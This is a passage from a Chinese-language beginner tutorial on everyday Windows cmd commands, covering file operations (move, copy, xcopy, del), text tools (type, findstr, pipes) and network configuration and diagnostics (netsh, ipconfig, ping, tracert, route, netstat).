alt=""></p><p>有管理员权限的cmd是这样的</p><p><img src="\media\2022\12\Windows常用cmd命令附件-28.webp" alt=""></p><h4 id="1-重命名目录"><a href="#1-重命名目录" class="headerlink" title="(1) 重命名目录"></a>(1) 重命名目录</h4><p>我们先把test.txt目录重命名为test</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /d d:/</span><br><span class="line">move test.txt test</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-30.webp" alt=""></p><p>这样就把目录改名了</p><h4 id="2-重命名文件"><a href="#2-重命名文件" class="headerlink" title="(2) 重命名文件"></a>(2) 重命名文件</h4><p>我们把test目录下的 ”新建文件夹.txt“ 重命名为 ”test.txt“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move 新建文件夹.txt test.txt</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-31.webp" alt=""></p><p>重命名文件的时候，记住后缀别忘了，比如这里的 .txt</p><h4 id="3-移动文件"><a href="#3-移动文件" class="headerlink" title="(3) 移动文件"></a>(3) 移动文件</h4><p>我们把 test.txt 移动到C盘下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move test.txt c:/</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-32.webp" alt=""></p><h4 id="4-注意事项"><a href="#4-注意事项" class="headerlink" title="(4) 注意事项"></a>(4) 注意事项</h4><p>对C盘进行操作的时候记得要使用管理员权限</p><p><strong>move命令无法移动目录</strong></p><h3 id="6-copy-复制，合并文件"><a href="#6-copy-复制，合并文件" class="headerlink" title="6. copy - 复制，合并文件"></a>6. copy - 复制，合并文件</h3><h4 id="1-复制文件"><a href="#1-复制文件" class="headerlink" title="(1) 复制文件"></a>(1) 复制文件</h4><p>我们先在桌面创建一个txt文件</p><p><img src="\media\2022\12\Windows常用cmd命令附件-33.webp" alt=""></p><p>我们把桌面上的test复制到D盘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ./desktop  # 转到桌面下</span><br><span class="line">copy test.txt d:  # 复制到D盘</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-34.webp" alt=""></p><h4 id="2-合并文件"><a href="#2-合并文件" class="headerlink" title="(2) 合并文件"></a>(2) 合并文件</h4><p>copy还支持将两个文件合并到一个文件中</p><p>现在有桌面两个文件</p><p><img src="\media\2022\12\Windows常用cmd命令附件-35.webp" alt=""></p><p>其中的内容分别是</p><p><img src="\media\2022\12\Windows常用cmd命令附件-36.webp" alt=""></p><p>我们现在将他们合并到3.txt里头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ./desktop  # 转到桌面下</span><br><span class="line">copy 1.txt+2.txt 3.txt  # 1.txt + 2.txt 合并为 3.txt</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-37.webp" alt=""></p><p>看一下3.txt的内容</p><p><img src="\media\2022\12\Windows常用cmd命令附件-38.webp" alt=""></p><h4 id="3-注意"><a href="#3-注意" class="headerlink" title="(3) 注意"></a>(3) 注意</h4><p>copy仅限于针对文件操作，不能操作目录</p><h3 id="7-xcopy-复制目录或文件"><a href="#7-xcopy-复制目录或文件" class="headerlink" title="7. xcopy - 复制目录或文件"></a>7. xcopy - 复制目录或文件</h3><h4 id="1-复制文件-1"><a href="#1-复制文件-1" class="headerlink" title="(1) 复制文件"></a>(1) 复制文件</h4><p>现在D盘下某个目录中有一个txt文件</p><p><img src="\media\2022\12\Windows常用cmd命令附件-39.webp" alt=""></p><p>我们现在把这个txt文件复制到C盘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xcopy D:\test\test_1.txt c:\  </span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-40.webp" alt=""></p><h4 id="2-复制目录中内容"><a href="#2-复制目录中内容" class="headerlink" title="(2) 复制目录中内容"></a>(2) 复制目录中内容</h4><p>我们将D盘下的test目录中的内容复制到C盘中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xcopy D:\test c:\</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-41.webp" alt=""></p><p>由于当前test目录下的文件只有test.txt一个，所以它就只复制了一个文件</p><p>而且在刚才我们已经在C盘中复制了一个test.txt，所以他会询问是否覆盖</p><h4 id="3-复制文件夹"><a href="#3-复制文件夹" class="headerlink" title="(3) 复制文件夹"></a>(3) 复制文件夹</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xcopy /e D:\test C:\test  </span><br><span class="line"># /e 代表复制目录和子目录，包括空目录。</span><br><span class="line"># D:\test C:\test  代表从 D:\test 复制到 C:\test</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-42.webp" alt=""></p><p>这里他会询问这个 C:\test 是目录还是文件</p><h4 id="4-其他操作"><a href="#4-其他操作" class="headerlink" title="(4) 其他操作"></a>(4) 其他操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xcopy /?</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-43.webp" alt=""></p><h3 id="8-del-删文件"><a href="#8-del-删文件" class="headerlink" title="8. del - 删文件"></a>8. del - 删文件</h3><p>删除D盘下的test文件</p><p><img src="\media\2022\12\image-3-20221219-072113.webp" alt=""></p><p><img src="\media\2022\12\image-3-20221219-072127.webp" alt=""></p><p>完事儿</p><p>其他的/?自己看看就行</p><h2 id="二-文本操作"><a href="#二-文本操作" class="headerlink" title="二. 文本操作"></a>二. 文本操作</h2><h3 id="1-type-显示文本内容-重定向"><a href="#1-type-显示文本内容-重定向" class="headerlink" title="1. type - 显示文本内容/重定向"></a>1. type - 显示文本内容/重定向</h3><p>我们想要把ipconfig命令的内容写在D盘的ip.txt下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &gt; D:/ip.txt  # 将ipconfig的内容写入 D:/ip.txt</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\image-3-20221219-072943.webp" alt=""></p><p>显示ip.txt的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type 新建文本文档.txt  # 显示文本中的内容</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\image-3-20221219-072621.webp" alt=""></p><h3 id="2-findstr-文件中寻找字符串"><a href="#2-findstr-文件中寻找字符串" class="headerlink" title="2. findstr - 文件中寻找字符串"></a>2. findstr - 文件中寻找字符串</h3><p>findstr命令可以在所选文本文件中寻找字符串</p><p>在ip.txt找包含192的文本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr 192 ip.txt  # 从ip.txt中找192</span><br></pre></td></tr></table></figure><p>之后它就会显示包含192的内容</p><p><img src="\media\2022\12\image-3-20221219-073806.webp" alt=""></p><p>我们现在想要找不包含192的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr /v 192 ip.txt  # 通过 /v 参数可以找不包含文本的内容</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\image-3-20221219-073943.webp" alt=""></p><p>这些都是不包含192的</p><h3 id="3-管道符概念"><a href="#3-管道符概念" class="headerlink" title="3. 管道符概念"></a>3. 管道符概念</h3><p>先看这个例子</p><p><img src="\media\2022\12\image-3-20221219-074157.webp" alt=""></p><p>管道符的作用就是把前面的代码的结果保存在某个内存里，然后用后面的命令处理这个结果</p><p>有句话是这么说的：将前面命令执行的结果作为后面命令操作的对象</p><h2 id="三-网络相关操作"><a href="#三-网络相关操作" class="headerlink" title="三. 网络相关操作"></a>三. 网络相关操作</h2><h3 id="1-配置tcp-ip参数"><a href="#1-配置tcp-ip参数" class="headerlink" title="1. 配置tcp/ip参数"></a>1. 配置tcp/ip参数</h3><p>tcp/ip参数就是：</p><ul><li><a href="https://trtyr.top/index.php/2022/12/19/ygidzzsdxj/">IP地址</a>：标识了网络中的某一台主机</li><li><a href="https://trtyr.top/index.php/2022/12/19/ygidzzsdxj/">子网掩码</a>：用于标识你的 IP 所处的网络的范围，子网掩码越大，网络范围越小</li><li>默认网关：标识与主机直连的路由器的IP地址</li><li>DNS：用于域名解析的</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(1) 静态配置IP地址，子网掩码，默认网关</span><br><span class="line"></span><br><span class="line">netsh address &quot;Ethernet0&quot; static 192.168.100.100 255.255.255.0 192.168.100.254</span><br><span class="line"></span><br><span class="line">将Ethernet0网卡配置IP为192.168.100.100；子网掩码为255.255.255.0；网关为192.168.100.254</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(2) 自动获取tcp/ip参数</span><br><span class="line">netsh interface ip set address &quot;Ethernet0&quot; dhcp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(3) 配置DNS为12.12.12.12</span><br><span class="line">netsh interface ip set dnsserver &quot;Ethernet0&quot; static 12.12.12.12</span><br><span class="line"></span><br><span class="line">(4) 配置备用DNS服务器</span><br><span class="line">netsh interface ip add dnsserver &quot;Ethernet0&quot; 8.8.8.8 index=2</span><br><span class="line"></span><br><span class="line">(5) 自动获取DNS</span><br><span class="line">netsh interface ip set dnsserver &quot;Ethernet0&quot; dhcp</span><br></pre></td></tr></table></figure><h3 id="2-查看tcp-ip参数"><a href="#2-查看tcp-ip参数" class="headerlink" title="2. 查看tcp/ip参数"></a>2. 查看tcp/ip参数</h3><h4 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 查看所有网卡的TCP/IP参数（IP地址、子网掩码、默认网关)</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line"># 查看所有网卡的TCP/IP参数(IP地址、子网码、默认网关、mac地址、dhcp地址、dns地址、主机名)</span><br><span class="line">ipconfig /all</span><br><span class="line"></span><br><span class="line"># 释放TCP/IP参数（IP没了）</span><br><span class="line">ipconfig /release</span><br><span class="line"></span><br><span class="line"># 重新获取TCP/IP参数</span><br><span class="line">ipconfig /renew</span><br><span class="line"></span><br><span class="line"># 刷新dns缓存</span><br><span class="line">ipconfig /flushdns</span><br></pre></td></tr></table></figure><h3 id="3-ping"><a href="#3-ping" class="headerlink" title="3. ping"></a>3. ping</h3><p>用于测试TCP/IP配置是否正确</p><p>用法如下图</p><p><img src="\media\2022\12\image-3-20221219-113812.webp" alt=""></p><h3 id="4-tracert"><a href="#4-tracert" class="headerlink" title="4. tracert"></a>4. tracert</h3><p>用来跟踪主机到达目标点中间会有多少个跃点（就是路由器）</p><p><img src="\media\2022\12\image-3-20221219-115512.webp" alt=""></p><h3 id="5-route"><a href="#5-route" class="headerlink" title="5. route"></a>5. route</h3><p>这个命令是用来操作网络路由表。</p><p><img src="\media\2022\12\image-3-20221219-115751.webp" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 打印路由表</span><br><span class="line">route -4 print</span><br><span class="line"></span><br><span class="line"># 添加路由条目 (112.53.42.52目标地址或网络/32代表子网掩码，192.168.33.1网关地址)</span><br><span class="line">route add 112.53.42.52/32 192.168.33.1</span><br><span class="line"></span><br><span class="line"># 删除路由条目</span><br><span class="line">route delete 112.53.42.52 #(112.53.42.52目标)</span><br></pre></td></tr></table></figure><h3 id="6-netstat"><a href="#6-netstat" class="headerlink" title="6. netstat"></a>6. netstat</h3><p><img src="\media\2022\12\image-3-20221219-120628.webp" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 列出所有连接</span><br><span class="line">netstat -a </span><br><span class="line"></span><br><span class="line"># 查看所有的TCP链接，包括进程，以数字形式显示</span><br><span class="line">netstat -anop tcp</span><br><span class="line"></span><br><span class="line"># 查看路由表</span><br><span class="line">netstat -r  等同于route print</span><br><span class="line"></span><br><span class="line"># 查询8090端口号是否占用</span><br><span class="line">netstat -ln|grep 8090</span><br><span class="line"></span><br><span class="line"># 查询占用端口号的程序名或pid</span><br><span class="line">netstat -lnp|grep 8090</span><br><span class="line"></span><br><span class="line"># 查询程序占用端口</span><br><span class="line">netstat -apn|grep server</span><br></pre></td></tr></table></figure><p><strong>LISTEN　　监听来自远方的TCP端口的连接请求</strong></p><p><strong>SYN-SENT　　在发送连接请求后等待匹配的连接请求</strong></p><p><strong>SYN-RECEIVED　　在收到和发送一个连接请求后等待对方对连接请求的确认</strong></p><p><strong>ESTABLISHED　　代表一个打开的连接</strong></p><p><strong>TIME-WAIT　　等待足够的时间以确保远程TCP接收到连接中断请求的确认</strong></p><p><strong>CLOSED　　没有任何连接状态</strong></p><p><strong>CLOSED-WAIT　　等待从本地用户发来的连接中断请求</strong></p><h2 id="四-其他"><a href="#四-其他" class="headerlink" title="四. 其他"></a>四. 其他</h2><p>其他的命令会在之后的文章中依次讲解到</p>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
